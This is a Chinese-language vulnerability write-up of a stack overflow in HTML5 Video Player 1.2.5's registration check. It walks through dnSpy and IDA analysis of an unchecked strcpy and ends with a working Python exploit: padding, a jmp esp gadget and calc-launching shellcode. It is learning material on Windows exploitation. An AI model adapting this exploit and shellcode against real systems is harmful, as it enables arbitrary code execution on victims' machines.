# Html Video Player 1.2.5 Stack Overflow 漏洞分析

> 第一次进行实际漏洞的分析，先从一个比较简单的栈溢出漏洞上手，顺便认识一下windows Pwn
>
> 跟着[M4x的教程](http://m4x.fun/post/html5-video-player-1.2.5-local-buffer-overflow-analysis/)走一发

## Step 1. 寻找溢出函数

经过对程序的检查，程序使用.net架构，可以用dnspy进行反编译分析，能够清晰的看到内部程序逻辑。

已经判断出来，溢出发生在进行注册时的账号和密码，可以通过keyword搜索定位到程序的对应位置，对溢出情况进行分析。

![](http://ww1.sinaimg.cn/large/006z37hrly1fzy7p3fxelj30gb09j3yq.jpg)

在dnspy中通过关键字*keycode*和*username*进行查找，可以定位到关键函数位置

![](http://ww1.sinaimg.cn/large/006z37hrly1fzwu1erw9pj30oq04ewel.jpg)

根据其中的函数名称，可以基本确定，第一个调用的makeSureEngineInit()是一个初始化函数，保证后续操作正常进行，与我们的输入无关。funcDLLVerifyKeyCode函数传递了username和keycode，溢出应该发生在此处。

```c#
// Token: 0x06000244 RID: 580
[DllImport("KeyCodeDLL.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi, EntryPoint = "#1")]
private static extern int funcDLLVerifyKeyCode(string strUserName, string strKeyCode);
```

点击定位可以发现，这个函数是dll文件中的导出函数，在dnspy中无法进行分析，可以使用ida打开KeyCodeDLL.dll，dll文件去掉了符号表，无法直接找到对应的函数，但是通过查看Export导出表，可以查看此dll文件中到处函数名与对应的地址。

![](http://ww1.sinaimg.cn/large/006z37hrly1fzx3ln2lrhj30ig04zq2w.jpg)

虽然前两个的名字无法确定，但是可以基本确定，我们的目标函数就在其中，点击反编译得到伪代码，通过分析两个函数结构和参数，很容易能够分辨出KeyCodeDLL_1函数即为溢出发生函数*funcDLLVerifyKeyCode*。接下来就是要在这个函数内对栈溢出进行分析了，相对就非常简单了。

## Step 2. 溢出分析

通过之前的分析可以确定溢出发生在这个函数中，即上图中偏移地址为0x100010D0的函数

```c
int __cdecl funcDLLVerifyKeyCode(int a1, int a2)
{
  int result; // eax

  if ( dword_10004010 )
    result = sub_10001850(a1, a2, 1);        //vul
  else
    result = 0;
  return result;
}
```

其中调用了**sub_10001850(username, password, 1)**函数，并且将用户名和密码传递进此函数，说明溢出发生在这个子函数内。

```c
int __thiscall sub_10001850(_DWORD *this, const char *username, const char *keycode, int a4)
{
  _DWORD *v4; // ebp
  int v5; // eax
  char *v7; // [esp+10h] [ebp-4F4h]
  char *v8; // [esp+14h] [ebp-4F0h]
  char *v9; // [esp+18h] [ebp-4ECh]
  int v10; // [esp+1Ch] [ebp-4E8h]
  char v11_uname; // [esp+20h] [ebp-4E4h]
  char v12_keycode; // [esp+120h] [ebp-3E4h]  // in stack
  __int16 v13; // [esp+220h] [ebp-2E4h]
  char v14; // [esp+224h] [ebp-2E0h]
  int v15; // [esp+2CCh] [ebp-238h]
  char v16[4]; // [esp+2D4h] [ebp-230h]
  char v17[4]; // [esp+2D8h] [ebp-22Ch]
  char v18; // [esp+2DCh] [ebp-228h]
  int v19; // [esp+384h] [ebp-180h]
  char v20; // [esp+390h] [ebp-174h]
  char v21; // [esp+394h] [ebp-170h]
  int v22; // [esp+43Ch] [ebp-C8h]
  char v23; // [esp+448h] [ebp-BCh]
  char v24; // [esp+44Ch] [ebp-B8h]
  int v25; // [esp+4F4h] [ebp-10h]
  char v26; // [esp+500h] [ebp-4h]

  v4 = this;
  this[68] = 0;
  strcpy(&v11_uname, username);    // stack overflow
  strcpy(&v12_keycode, keycode);
  v7 = &v11_uname;
  v17[0] = 0;
  v13 = -(a4 != 0);
    ...
```

很容易可以发现，在将username和keycode使用**strcpy**函数复制到本函数的局部变量的时候，没有进行长度检查和限制，导致可以使用超长的字符串覆盖返回地址，造成栈溢出。而且在xp系统中，没有开启ASLR(PIE) 和 DEP(NX)保护，导致漏洞非常容易利用，并且username和keycode都可以造成溢出，但是keycode在后面的函数过程中没有使用，利用更加容易。

*差点没有注意到的一点是，这个程序中使用esp进行定位，需要进行覆盖的栈结构需要进行调试才能确定*

而且最后的返回语句是**retn    0Ch**

```assembly
.text:100019FA ; 58:   return v4[68];
.text:100019FA
.text:100019FA loc_100019FA:                           ; CODE XREF: sub_10001850+13B↑j
.text:100019FA                                         ; sub_10001850+14F↑j ...
.text:100019FA                 mov     eax, [ebp+110h]
.text:10001A00                 pop     edi
.text:10001A01                 pop     esi
.text:10001A02                 pop     ebp
.text:10001A03                 pop     ebx
.text:10001A04                 add     esp, 4F4h
.text:10001A0A                 retn    0Ch
```

>RETN/RETF在反汇编代码中呈现的形式如下：
>
>RETN
>
>RETN   操作数1
>
>RETF
>
>RETF   操作数1
>
>
>
>RETN等价于一条指令：
>
>​	POP   eip
>
>RETF等价于两条指令：
>　　POP   eip
>　　POP   CS
>
>而带有操作数的RETN/RETF指令则是在POP之后，执行ESP=ESP+操作数1。

可知在执行 retn 0Ch 后，esp = esp + 0xc

又：

> windows 中经常使用 `jmp esp + shellcode` 的方法，第一次是在 `Jarvis OJ` 的 [BackDoor](http://m4x.fun/post/jarvisoj-pwn-writeup/#backdoor-200) 这道题目中见到了这种技巧。
>
> 写了一段弹计算器的 shellcode，需要注意不能出现截断 `strcpy()` 的字符
>
> ```python
> shellcode =  "\x31\xC9"				# xor ecx, ecx         
> shellcode += "\x51"                 # push ecx  
> shellcode += "\x68\x63\x61\x6C\x63" # push 0x63616c63 (push calc)  
> shellcode += "\x54"                 # push dword ptr esp  
> shellcode += "\xBA\xC7\x93\xbf\x77" # mov edx, 0x77bf93c7 (mov edx, system)
> shellcode += "\xFF\xD2"             # call edx  
> shellcode += "\x90" * 2				# suffix
> ```

可知在执行 jmp esp之时，栈顶已经下移12字节，所以在返回地址和shellcode之间应该填入12个字符。

至此，这个漏洞就算搞清楚来龙去脉，exploit也比较简单，调试出运行时的栈空间长度，加上gadgets，padding和shellcode即可，将payload打印到文件中，从文件中复制到软件的注册页面

```python
import struct

p32 = lambda x: struct.pack('<I', x)

jesp = 0x7d711020					# shell32.dll

shellcode =  "\x31\xC9"      		# xor ecx, ecx         
shellcode += "\x51"                 # push ecx  
shellcode += "\x68\x63\x61\x6C\x63" # push 0x63616c63 (push calc)  
shellcode += "\x54"                 # push dword ptr esp  
shellcode += "\xBA\xC7\x93\xbf\x77" # mov edx, 0x77bf93c7 (mov edx, system)
shellcode += "\xFF\xD2";            # call edx  
shellcode += "\x90" * 2 			# suffix
    
payload = 'A' * 996 + p32(jesp) + "aaaabbbbcccc" + shellcode

# print(payload)
with open("exploit.txt", "wb") as f:
    f.write(payload)
    
# Author : M4x
```

效果喜人

![](http://ww1.sinaimg.cn/large/006z37hrly1fzy9mlftlbj30vu0jvt97.jpg)